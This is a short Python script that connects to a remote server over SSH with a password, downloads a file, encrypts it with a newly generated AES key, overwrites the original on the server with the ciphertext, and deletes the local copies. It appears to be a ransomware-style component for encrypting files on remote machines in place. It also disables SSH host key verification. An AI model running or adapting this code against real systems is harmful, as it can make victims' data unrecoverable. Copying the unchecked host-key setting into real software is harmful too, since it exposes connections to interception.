import paramiko
import os
from encryptors import aes_encryptor

def encrypt_remote_file(ip, username, password, remote_path, local_temp="temp_remote_file"):
    try:
        print(f"🔌 Connecting to {ip}...")
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password)

        sftp = ssh.open_sftp()

        print(f"📥 Downloading original file from remote: {remote_path}...")
        sftp.get(remote_path, local_temp)

        print(f"🔐 Encrypting file...")
        aes_encryptor.generate_key()
        encrypted_path = aes_encryptor.encrypt_file(local_temp)

        print(f"📤 Uploading encrypted file back to server (overwriting original)...")
        sftp.put(encrypted_path, remote_path)

        print(f"🧹 Cleaning up local temporary files...")
        if os.path.exists(local_temp):
            os.remove(local_temp)
        if os.path.exists(encrypted_path):
            os.remove(encrypted_path)

        sftp.close()
        ssh.close()

        print(f"✅ Success! Remote file {remote_path} is now encrypted.")
        return True

    except Exception as e:
        print(f"❌ Error during process: {e}")
        return None
